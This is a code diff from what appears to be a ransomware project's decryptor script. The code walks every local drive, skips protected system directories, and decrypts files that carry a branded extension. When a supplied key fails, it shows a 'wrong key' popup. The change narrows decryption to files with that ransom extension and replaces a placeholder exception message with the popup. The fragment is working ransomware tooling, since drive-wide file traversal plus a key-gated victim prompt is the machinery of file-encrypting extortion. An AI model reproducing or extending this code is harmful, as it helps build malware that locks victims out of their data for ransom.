@@ -23,20 +23,22 @@ if __name__ == '__main__':
                 cipher.set_fernet(key)
                 
                 local_drives = cipher.get_local_drives()
-                
+
                 for ld in local_drives:
                     for root, dirs, files in os.walk(ld):
                         [dirs.remove(d) for d in list(dirs) if d in cipher.PROTECTED_DIRS]
                         for fn in files:
                             full_path = root + os.sep + fn
-                            print(full_path + ' -> [decrypted]')
-                            cipher.symmetric_encrypt_or_decrypt(full_path, opt='decrypt')
+                            ext=cipher.get_file_extension(full_path)
+                            if ext == cipher.BRAND_EXT:
+                                print(full_path + ' -> [decrypted]')
+                                cipher.symmetric_encrypt_or_decrypt(full_path, opt='decrypt')
                 break # salimos del bucle infinito
             else:
                 wrong_key_popup()
                 
         except Exception as e:
-            print('Hello handling the exception here')
+            wrong_key_popup()
             print(e)
     
     print('All data was successfully decrypted')
